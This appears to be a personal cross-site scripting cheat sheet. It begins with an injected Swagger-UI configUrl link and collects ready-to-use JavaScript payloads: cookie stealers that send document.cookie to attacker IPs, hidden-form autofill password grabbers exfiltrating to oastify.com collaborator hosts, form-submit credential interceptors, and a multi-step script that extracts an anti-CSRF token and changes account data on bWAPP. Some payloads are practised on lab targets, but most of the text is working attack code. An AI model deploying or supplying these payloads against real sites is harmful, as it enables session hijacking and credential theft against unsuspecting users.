
https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==








# XSS

# basic fuzzing

# breaking string

'-alert(1)-'
&apos;-alert(1)-&apos;

# Redirecting User to malicious websites-

<script>window.location.replace("https://github.com");</script>

# stealing cookie

resources:
https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md

Good Read
https://melotover.medium.com/how-i-bypassed-a-tough-waf-to-steal-user-cookies-using-xss-da75f28108e4
https://guides.codepath.com/websecurity/Cookie-Theft

<script>
var i=new Image(); 
i.src="http://192.168.46.128/?cookie="+btoa(document.cookie); // btoa is base64 encoded
</script>

<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>

<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://192.168.46.128/?"+document.cookie, true); 
xhr.withCredentials = true;
xhr.send(null);
</script>

<script>
fetch('http://192.168.46.128', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

# Stealing Password

resources
https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html
https://www.doyler.net/security-not-included/xss-password-stealing
https://medium.com/dark-roast-security/password-stealing-from-https-login-page-and-csrf-bypass-with-reflected-xss-76f56ebc4516

* If there is stored or reflected XSS and if there exist saved password which autofills for login
https://demo.testfire.net/login.jsp

<script>
    function x() {

fetch('https://betndoj4ll10lrn6ygbcale3buhm5et3.oastify.com',{
        method:'POST',
        mode:'no-cors',
        body: document.getElementById('username').value+':'+document.getElementById('password').value
        });
    }

    function timer() {
        setTimeout(x, 1000);
    }

</script>
<body onload="timer()">
    <h1 id="creds"></h1>
    <form id="" method="POST" style="visibility: hidden; position: absolute; top: -1000; left: 1000;">
        Username: <input type="text" name="username" id="username" /><br />
        Password: <input type="password" name="password" id="password" /><br />
        <input type="submit" value="gö" />
    </form>
</body>

OR 

<script>
    function stealCreds(){

      new Image().src="https://eweqvr173oj33u59gjtfsow6txzqnib7.oastify.com/login?u=" + document.getElementById('username').value + "&p=" + document.getElementById('password').value;
    }

    function timer() {
        setTimeout(stealCreds, 1000);
    }

</script>

<body onload="timer()">
<div style="opacity:0;">
  <form>
    <input type="text" name="username" id="username" />
    <input type="password" name="password" id="password" />
  </form>
</div>
</body>


if the page loads with some url param like for language ?en=us, then this param can be used as vector to insert script 
to test below i assumed /bWAPP/htmli_get.php
<script>
function intercept(){

var usr =  document.getElementById('firstname').value;
var pas = document.getElementById('lastname').value;

var xhr = new XMLHttpRequest();
xhr.open("GET","http://192.168.46.128/?u="+usr+"&p="+pas,true);
xhr.withCredentials=true;
xhr.send();
return false;
}
document.forms[0].onsubmit = intercept
</script>

OR

<script>
function intercept(){

var usr =  document.getElementById('firstname').value;
var pas = document.getElementById('lastname').value;

var xhr = new XMLHttpRequest();
xhr.open("GET","http://192.168.46.128/?u="+usr+"&p="+pas,true);
xhr.withCredentials=true;
xhr.send();

}
document.getElementById('firstname').addEventListener('change',intercept);
</script>


# Bypassing Anti-CSRF Token using XSS

resources
https://medium.com/dark-roast-security/password-stealing-from-https-login-page-and-csrf-bypass-with-reflected-xss-76f56ebc4516

Good read
https://security.stackexchange.com/questions/207090/anti-csrf-mechanism-in-a-form-changing-password-with-an-old-password-input-is-it
https://stackoverflow.com/questions/10466241/new-csrf-token-per-request-or-not


Used bwapp to perform this!, exploited xss on http://192.168.43.166/bWAPP/htmli_get.php medium level by double usl encoding, requested http://192.168.43.166/bWAPP/csrf_3.php and extracted token value using regex, then performed attack

debugging code
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "csrf_3.php", true); 
xhr.setRequestHeader('Accept','text/html');
xhr.withCredentials = true;
xhr.send();
while(xhr.readyState < 5 ){

var a = String(xhr.responseText.match(/.*<input type="hidden".*>.*/)).match(/value=".*"/);
alert(a);
}
</script>

Payload-1 (try 1)
The below payload didnt worked because page was generating token per request, but this works successfully for per session token



<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "csrf_3.php", true); 
xhr.setRequestHeader('Accept','text/html');
xhr.withCredentials = true;
xhr.send();
xhr.onload = exploitcsrf;

function exploitcsrf(){
var token = String(String(this.responseText.match(/.*<input type="hidden".*>.*/)).match(/value=".*"/));
const csrftoken = token.substr(7,token.length-8);
const params = "secret=Hacked"+"&token="+csrftoken+"&action=change";

var nxhr = new XMLHttpRequest();
nxhr.open("POST", "csrf_3.php", true); 
nxhr.withCredentials = true;
nxhr.send(params);
nxhr.onload = alert('you are hacked');
}
</script>

debugging with redirect

Thougt that I could make a diff request t if this post request could be converted to GET and gets accepted, and it does!!

<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "csrf_3.php", true); 
xhr.setRequestHeader('Accept','text/html');
xhr.withCredentials = true;
xhr.send();
xhr.onload = exploitcsrf;

function exploitcsrf(){
var token = String(String(this.responseText.match(/.*<input type="hidden".*>.*/)).match(/value=".*"/));
const csrftoken = token.substr(7,token.length-8);
const params = "secret=Hacked"+"&token="+csrftoken+"&action=change";
window.location.replace('http://192.168.43.166/bWAPP/csrf_3.php?secret=Hacked&token='+csrftoken+'&action=change');
}
</script>

Final Payload
finally i made another request and logout the user

<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "csrf_3.php", true); 
xhr.setRequestHeader('Accept','text/html');
xhr.withCredentials = true;
xhr.send();
xhr.onload = exploitcsrf;

function exploitcsrf(){
var token = String(String(this.responseText.match(/.*<input type="hidden".*>.*/)).match(/value=".*"/));
const csrftoken = token.substr(7,token.length-8);
const params = "secret=Hacked"+"&token="+csrftoken+"&action=change";

var nxhr = new XMLHttpRequest();
nxhr.open("GET", 'csrf_3.php?secret=Hacked&token='+csrftoken+'&action=change', true); 
nxhr.withCredentials = true;
nxhr.send();
nxhr.onload = function(){
alert('You are Hacked!');
window.location.replace('http://192.168.43.166/bWAPP/login.php');
}
}
</script>

************************************************************************************


****************************************************************************************

